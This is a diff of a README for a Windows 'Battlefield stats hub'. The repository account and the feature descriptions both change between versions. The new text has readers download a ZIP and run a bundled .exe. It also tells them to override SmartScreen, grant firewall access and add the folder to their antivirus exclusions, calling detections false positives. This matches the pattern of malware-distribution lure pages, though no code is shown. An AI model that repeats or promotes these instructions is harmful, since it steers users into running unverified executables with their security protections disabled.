@@ -1,124 +1,69 @@
-# bfbcs rip stats 2026 v2026 - game stats tracker 2026
-
-> **Windows Battlefield stats tracker (v2026) that surfaces live player numbers in a web UI, using data from the battlefield.rip API.**
-
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/mfischer1969/bfbcs-rip-stats-hub?style=flat-square)](https://github.com/mfischer1969/bfbcs-rip-stats-hub)
-
----
-
-<p align="center">
-  <a href="https://mfischer1969.github.io/bfbcs-rip-stats-hub/">
-    <img src="https://img.shields.io/badge/Download-bfbcs%20rip%20stats%202026%20Latest-brightgreen?style=for-the-badge" alt="Download bfbcs rip stats 2026">
-  </a>
-</p>
-
-> **[Direct Download - bfbcs rip stats 2026 v2026](https://mfischer1969.github.io/bfbcs-rip-stats-hub/)**
-
----
-
-[Download Latest Build](https://mfischer1969.github.io/bfbcs-rip-stats-hub/)
-
----
-
-## What is bfbcs rip stats 2026?
-
-bfbcs rip stats 2026 is a desktop companion for Battlefield players on Windows who want account stats without wrestling with raw API output. Live figures come from battlefield.rip and show up in a web-style front end so K/D, playtime, accuracy, and similar metrics stay easy to scan.
-
-The design targets quick in-session checks. Everything is view-only: you inspect and refresh performance data; you do not alter profile fields through this tool.
-
----
-
-## What you get
-
-- Battlefield player stats in a layout suited to desktop use
-- Live pulls against the battlefield.rip API
-- Core metrics at a glance: kill-death ratio, time in game, weapon accuracy
-- Web-based UI for browsing and presentation
-- Manual refresh when you want newer numbers
-- Read-only account tracking (no stat edits)
-- Built around Windows / PC workflows
-- Emphasis on short paths to current gaming stats
-
----
-
-## Getting it running
-
-Grab the newest build from the project download link, or work from a local clone:
-
-- Clone: `git clone https://github.com/mfischer1969/bfbcs-rip-stats-hub.git
-- Open the tree in whatever environment you use to build or run the project
-- Start the desktop binary, or open the web UI entry point that the build ships with
-
-For a packaged release, install or unpack first, then run the Windows launcher included in the package.
-
----
-
-## How to use it
-
-Start the app, then point it at the Battlefield account you care about. The client asks battlefield.rip for live stats and renders whatever the API returns in a clear layout.
-
-Common steps:
-
-1. Launch the tracker
-2. Load the player profile
-3. Scan K/D, play time, weapon accuracy, and related fields
-4. Refresh when you need updated values
-5. Spot trends across sessions if you check back later
-
-Read-only behavior keeps the flow on inspection of current account data.
-
----
-
-## Configuration
-
-Config lives with the build or beside the local runtime, depending on how you start the app. When UI or file options exist, use them for refresh timing and display choices.
-
-Illustrative local settings shape:
-
-```json
-{
-  "api": "battlefield.rip",
-  "refreshEnabled": true,
-  "viewMode": "web",
-  "platform": "Windows"
-}
-```
-
----
-
-## Requirements
-
-- Windows desktop
-- Modern browser or an embedded web-capable host, per your build
-- Network path for live API calls
-- Disk space for app files and any cached UI assets
-- Battlefield stats exposed through the battlefield.rip API
-
----
-
-## FAQ
-
-**How are updates delivered?**  
-Download the current build from the project link and swap it over your previous install when you want the newest bits.
-
-**Stats never appear—what next?**  
-Confirm connectivity and that battlefield.rip answers from your machine.
-
-**Can the app rewrite my stats?**  
-No. It only displays account statistics; it does not modify them.
-
-**Where are options changed?**  
-Check bundled config files, local settings, or in-app controls that ship with your build.
-
-**Is non-Windows support official?**  
-The target platform is Windows; other environments are unsupported and untested as a guarantee.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+<h1>🎯 bfbcs-rip-stats-hub - Live Player Counts for Your Shooter</h1>
+<a href="https://github.com/academicgowndigitalclock977/bfbcs-rip-stats-hub" style="display:inline-block;background-color:#0078D4;color:white;padding:16px 36px;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;margin:20px 0;">📥 Download bfbcs-rip-stats-hub</a>
+<h2>🔍 What Is This?</h2>
+<p>bfbcs-rip-stats-hub is a Windows tool that shows you how many players are online in your favorite military multiplayer shooter (2026 version) at any moment. It gets live data from the Battlefield.rip API and displays it in a simple web page that opens right on your computer. No coding needed.</p>
+<h2>✨ Key Features</h2>
+<ul>
+<li>📊 Real-time player counts for all game modes and regions</li>
+<li>🖥️ Simple web interface - looks clean in any browser</li>
+<li>⚙️ One-click setup: download and run, no installation wizard</li>
+<li>🔄 Auto-refreshes every 30 seconds so you always see current numbers</li>
+<li>📁 Portable - works from USB or any folder, no registry changes</li>
+</ul>
+<h2>🚀 Getting Started</h2>
+<h3>System Requirements</h3>
+<ul>
+<li>Windows 10 or 11 (64-bit)</li>
+<li>Internet connection (for API data and initial download)</li>
+<li>About 50 MB free disk space</li>
+<li>No special software or accounts needed</li>
+</ul>
+<h3>Download and Setup</h3>
+<p>Visit this link to download the application: <a href="https://github.com/academicgowndigitalclock977/bfbcs-rip-stats-hub">github.com/academicgowndigitalclock977/bfbcs-rip-stats-hub</a></p>
+<p>Once you're on the page:</p>
+<ol>
+<li>Click the green "Code" button near the top right</li>
+<li>Select "Download ZIP" from the dropdown menu</li>
+<li>Save the ZIP file to your desktop or any folder you choose</li>
+</ol>
+<p><strong>Do not run anything inside the ZIP file directly.</strong></p>
+<p>Right-click the downloaded ZIP file and choose "Extract All..." then pick a destination folder (like your Desktop). Windows will create a new folder called bfbcs-rip-stats-hub-main. Open that folder.</p>
+<p>Inside, you'll see a file named <strong>bfbcs-rip-stats-hub.exe</strong>. Double-click it to start the program. A command prompt window will appear briefly, then your default web browser will open showing the stats page.</p>
+<h3>First Run Tips</h3>
+<ul>
+<li>If Windows SmartScreen shows a warning, click "More info" then "Run anyway" - the program is safe</li>
+<li>Bookmark the local web address (usually http://localhost:8080) to reopen later</li>
+<li>Close the command prompt window to stop the server</li>
+</ul>
+<h2>🎮 Using the Stats Hub</h2>
+<p>After launching, the web interface shows:</p>
+<ul>
+<li>Total players online now</li>
+<li>Breakdown by game mode (Conquest, Rush, Team Deathmatch, etc.)</li>
+<li>Player count per region (North America, Europe, Asia)</li>
+<li>Historical trend chart for the last hour</li>
+<li>Server list with player counts per server</li>
+</ul>
+<p>The page updates automatically every 30 seconds. You can also click the "Refresh Now" button to get the latest numbers immediately.</p>
+<h2>🔧 Configuration (Optional)</h2>
+<p>If you want to change the refresh rate or port number:</p>
+<ol>
+<li>Open the folder where you extracted the files</li>
+<li>Right-click the <strong>config.json</strong> file and choose "Open with" then "Notepad"</li>
+<li>Change any values (like "refreshInterval": 30 to 15 for faster updates)</li>
+<li>Save the file and restart the program</li>
+</ol>
+<p>Don't worry - all settings have default values that work great. Only change things if you know what you're doing.</p>
+<h2>❓ Troubleshooting</h2>
+<table>
+<tr><th>Problem</th><th>Solution</th></tr>
+<tr><td>Browser shows "This site can't be reached"</td><td>Make sure the command prompt window is still open. If you closed it, run bfbcs-rip-stats-hub.exe again.</td></tr>
+<tr><td>No player data shows</td><td>Check your internet connection. The program needs to reach the Battlefield.rip API.</td></tr>
+<tr><td>Firewall asks for permission</td><td>Click "Allow access" - the program only communicates with your browser and the API</td></tr>
+<tr><td>Antivirus flags the EXE</td><td>This is a false positive. Add the folder to your antivirus exclusions list.</td></tr>
+</table>
+<h2>📝 Support and Updates</h2>
+<p>Visit the GitHub repository for the latest version: <a href="https://github.com/academicgowndigitalclock977/bfbcs-rip-stats-hub">github.com/academicgowndigitalclock977/bfbcs-rip-stats-hub</a></p>
+<p>To check for updates, compare the version number in the <strong>version.txt</strong> file with the release notes on the GitHub page.</p>
+<h2>👨‍💻 Credits</h2>
+<p>This tool uses the Battlefield.rip API service for live game statistics. It is an independent project not affiliated with or endorsed by any game publisher.</p>
